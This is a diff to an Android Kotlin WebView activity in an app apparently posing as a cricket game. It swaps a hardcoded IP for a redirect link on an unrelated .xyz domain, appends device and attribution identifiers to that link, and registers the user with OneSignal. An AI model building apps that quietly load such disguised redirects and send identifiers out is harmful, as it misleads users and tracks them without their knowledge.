@@ -15,8 +15,11 @@ import com.nautilus.RealCricket.R
 import com.nautilus.RealCricket.blck.CNST.C1
 import com.nautilus.RealCricket.blck.CNST.D1
 import com.nautilus.RealCricket.blck.CNST.MAIN_ID
+import com.onesignal.OneSignal
 import com.orhanobut.hawk.Hawk
 import dagger.hilt.android.AndroidEntryPoint
+import org.json.JSONException
+import org.json.JSONObject
 import java.io.File
 import java.io.IOException
 
@@ -163,6 +166,58 @@ class Webby : AppCompatActivity() {
 
         vv.loadUrl(getUrl())
     }
+    fun pushToOneSignal(string: String){
+// Setting External User Id with Callback Available in SDK Version 4.0.0+
+        OneSignal.setExternalUserId(
+            string,
+            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
+                override fun onSuccess(results: JSONObject) {
+                    try {
+                        if (results.has("push") && results.getJSONObject("push").has("success")) {
+                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
+                            OneSignal.onesignalLog(
+                                OneSignal.LOG_LEVEL.VERBOSE,
+                                "Set external user id for push status: $isPushSuccess"
+                            )
+                        }
+                    } catch (e: JSONException) {
+                        e.printStackTrace()
+                    }
+                    try {
+                        if (results.has("email") && results.getJSONObject("email").has("success")) {
+                            val isEmailSuccess =
+                                results.getJSONObject("email").getBoolean("success")
+                            OneSignal.onesignalLog(
+                                OneSignal.LOG_LEVEL.VERBOSE,
+                                "Set external user id for email status: $isEmailSuccess"
+                            )
+                        }
+                    } catch (e: JSONException) {
+                        e.printStackTrace()
+                    }
+                    try {
+                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
+                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
+                            OneSignal.onesignalLog(
+                                OneSignal.LOG_LEVEL.VERBOSE,
+                                "Set external user id for sms status: $isSmsSuccess"
+                            )
+                        }
+                    } catch (e: JSONException) {
+                        e.printStackTrace()
+                    }
+                }
+
+                override fun onFailure(error: OneSignal.ExternalIdError) {
+                    // The results will contain channel failure statuses
+                    // Use this to detect if external_user_id was not set and retry when a better network connection is made
+                    OneSignal.onesignalLog(
+                        OneSignal.LOG_LEVEL.VERBOSE,
+                        "Set external user id done with error: $error"
+                    )
+                }
+            })
+    }
 
     private fun webSettings() {
         val webSettings = vv.settings
@@ -207,25 +262,28 @@ class Webby : AppCompatActivity() {
         val three = "sub_id_3="
         val four = "sub_id_4="
         val five = "sub_id_5="
-
+        val six = "sub_id_6="
 
         val first = "http://"
-        val second = "159.69.199.74/BqyPhg"
+        val second = "felicitysapphire.xyz/go.php?to=2&"
 
         val androidVersion = Build.VERSION.RELEASE
+        val namingI = "naming"
+        val linkornull = "deeporg"
 
         val resultAB = first + second
 
         var after = ""
         if (cpOne != "null") {
             after =
-                "$resultAB?$one$cpOne&$two$afId&$three$mainid&$four$pack&$five$androidVersion"
+                "$resultAB$one$cpOne&$two$afId&$three$mainid&$four$pack&$five$androidVersion&$six$namingI"
         } else {
             after =
-                "$resultAB?$one$dpOne&$two$afId&$three$mainid&$four$pack&$five$androidVersion"
+                "$resultAB$one$dpOne&$two$afId&$three$mainid&$four$pack&$five$androidVersion&$six$linkornull"
         }
 
         Log.d("TESTAG", "Test Result $after")
+        pushToOneSignal(afId.toString())
         return spoon.getString("SAVED_URL", after).toString()
     }
 
